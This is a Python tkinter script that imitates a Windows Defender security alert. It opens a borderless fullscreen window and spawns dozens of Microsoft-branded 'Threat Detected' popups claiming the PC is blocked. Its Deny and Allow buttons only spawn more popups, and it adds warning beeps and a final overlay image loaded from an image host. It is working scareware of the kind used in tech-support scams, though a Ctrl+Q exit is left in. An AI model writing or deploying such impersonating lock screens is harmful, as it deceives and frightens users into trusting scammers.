import tkinter as tk
import random
import sys
import winsound
import pyttsx3
from PIL import Image, ImageTk
import urllib.request
import io
import threading


# ---------------- Main Fullscreen Freeze UI ----------------
root = tk.Tk()
root.title("Windows-Defender - Security Warning")
root.attributes("-fullscreen", True)
root.overrideredirect(True)

# Load background image once
image_url = "https://i.ibb.co/wFhz3hv0/Screenshot-2025-08-19-010346.png"
with urllib.request.urlopen(image_url) as u:
    raw_data = u.read()
bg_img = Image.open(io.BytesIO(raw_data))

screen_w = root.winfo_screenwidth()
screen_h = root.winfo_screenheight()
bg_img = bg_img.resize((screen_w, screen_h), Image.LANCZOS)
bg_photo = ImageTk.PhotoImage(bg_img)

bg_label = tk.Label(root, image=bg_photo)
bg_label.place(x=0, y=0, relwidth=1, relheight=1)

# ✅ Shortcut to close everything (kept!)
root.bind_all("<Control-q>", lambda e: sys.exit(0))

# ✅ Cache Microsoft logo once
logo_url = "https://i.ibb.co/tTRTcr3F/microsoft1.png"
with urllib.request.urlopen(logo_url) as u:
    raw_logo = u.read()
logo_img = Image.open(io.BytesIO(raw_logo)).resize((18, 18), Image.LANCZOS)
cached_logo = ImageTk.PhotoImage(logo_img)


def create_defender_popup(x=None, y=None):
    """Creates a Defender-style popup window"""
    popup = tk.Toplevel(root)
    popup.geometry("520x360+" + str(x if x else random.randint(50, root.winfo_screenwidth() - 550)) +
                   "+" + str(y if y else random.randint(50, root.winfo_screenheight() - 400)))
    popup.configure(bg="white")
    popup.overrideredirect(True)
    popup.lift()
    popup.bind("<FocusOut>", lambda e: popup.lift())  # keep visible

    # ---------- Title Bar ----------
    title_bar = tk.Frame(popup, bg="#0078D7", height=30)
    title_bar.pack(fill="x", side="top")

    # Use cached logo ✅
    logo_label = tk.Label(title_bar, image=cached_logo, bg="#0078D7")
    logo_label.image = cached_logo
    logo_label.pack(side="left", padx=6, pady=3)

    tk.Label(
        title_bar,
        text="Windows Defender Security Center",
        bg="#0078d7",
        fg="white",
        font=("Segoe UI", 10, "bold")
    ).pack(side="left", pady=3)

    btn_frame = tk.Frame(title_bar, bg="#0078d7")
    btn_frame.pack(side="right", padx=2)

    for txt, col, w in [("—", "#0078D7", 5), ("▢", "#0078D7", 5), ("✕", "#0078D7", 5)]:
        tk.Label(
            btn_frame,
            text=txt,
            font=("Segoe UI", 10, "bold"),
            bg=col,
            fg="white",
            width=w,
            height=1
        ).pack(side="left", padx=1, pady=1)

    # ---------- Header ----------
    header = tk.Frame(popup, bg="white")
    header.pack(fill="x", padx=20, pady=15)

    tk.Label(
        header,
        text="Threat Detected!",
        font=("Segoe UI", 13, "bold"),
        fg="red",
        bg="white"
    ).pack(anchor="w")

    tk.Label(
        header,
        text="App: Ads.financetrack(2).dll\nAlert level: Severe\nStatus: Active",
        font=("Segoe UI", 10),
        bg="white",
        justify="left"
    ).pack(anchor="w", pady=5)

    tk.Frame(popup, height=1, bg="#D0D0D0").pack(fill="x", padx=10, pady=10)

    # ---------- Message ----------
    tk.Label(
        popup,
        text="Access to this PC has been blocked for security reasons.\n"
             "Please choose an action below to continue.",
        font=("Segoe UI", 10),
        bg="white",
        justify="center"
    ).pack(pady=5)

    # ---------- Buttons ----------
    btn_frame2 = tk.Frame(popup, bg="white")
    btn_frame2.pack(pady=15)

    tk.Button(btn_frame2, text="Deny", width=14, bg="#F3F3F3", relief="groove",
              command=lambda: create_defender_popup()).pack(side="left", padx=10)
    tk.Button(btn_frame2, text="Allow", width=14, bg="#0078D7", fg="white", relief="flat",
              command=lambda: create_defender_popup()).pack(side="right", padx=10)

    # ---------- Bottom ----------
    bottom_bar = tk.Label(
        popup,
        text="Microsoft Defender Antivirus",
        font=("Segoe UI", 9),
        bg="#F3F3F3",
        fg="black",
        anchor="w",
        padx=10
    )
    bottom_bar.pack(side="bottom", fill="x")


# ---------------- Voice (threaded) ----------------
def speak_message():
    def run():
        engine = pyttsx3.init()
        engine.say("Security alert. Windows Defender has blocked access for your safety.")
        engine.runAndWait()
    threading.Thread(target=run, daemon=True).start()


# ---------------- Spawn Popups in Batches ----------------
def spawn_many_popups(total=30, batch_size=3, delay=1500):
    """Spawn popups in batches (lighter: 3 every 1.5 seconds)"""
    def spawn_batch(remaining):
        for _ in range(min(batch_size, remaining)):
            create_defender_popup()
        winsound.MessageBeep(winsound.MB_ICONHAND)  # ✅ beep once per batch
        if remaining > batch_size:
            root.after(delay, lambda: spawn_batch(remaining - batch_size))

    spawn_batch(total)


# ---------------- Final Image on Top ----------------
def show_final_image():
    top_img_url = "https://i.ibb.co/qMxH8mG2/Your-paragraph-text.png"
    with urllib.request.urlopen(top_img_url) as u:
        raw_data = u.read()
    img = Image.open(io.BytesIO(raw_data)).resize((600, 350), Image.LANCZOS)  # ✅ taller height
    photo = ImageTk.PhotoImage(img)

    final_popup = tk.Toplevel(root)
    final_popup.overrideredirect(True)
    final_popup.attributes("-topmost", True)

    x = (screen_w // 2) - 300
    y = (screen_h // 2) - 175  # ✅ adjust for taller popup
    final_popup.geometry(f"600x350+{x}+{y}")

    lbl = tk.Label(final_popup, image=photo, bg="black")
    lbl.image = photo
    lbl.pack(fill="both", expand=True)


# ---------------- Start Sequence ----------------
root.after(200, lambda: spawn_many_popups(30, batch_size=3, delay=1500))
# root.after(200, speak_message)
root.after(2000, show_final_image)

root.mainloop()